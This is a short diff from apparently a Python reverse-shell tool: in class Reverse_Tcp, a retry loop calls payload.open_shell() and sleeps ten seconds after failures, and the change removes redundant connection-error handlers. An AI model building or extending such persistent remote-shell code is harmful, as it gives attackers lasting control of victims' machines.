@@ -140,12 +140,6 @@ class Reverse_Tcp:
                 payload.open_shell()
             except ValueError:
                 time.sleep(10)
-            except ConnectionRefusedError:
-                time.sleep(10)
-            except ConnectionResetError:
-                time.sleep(10)
-            except ConnectionError:
-                time.sleep(10)
             except Exception:
                 time.sleep(10)
     
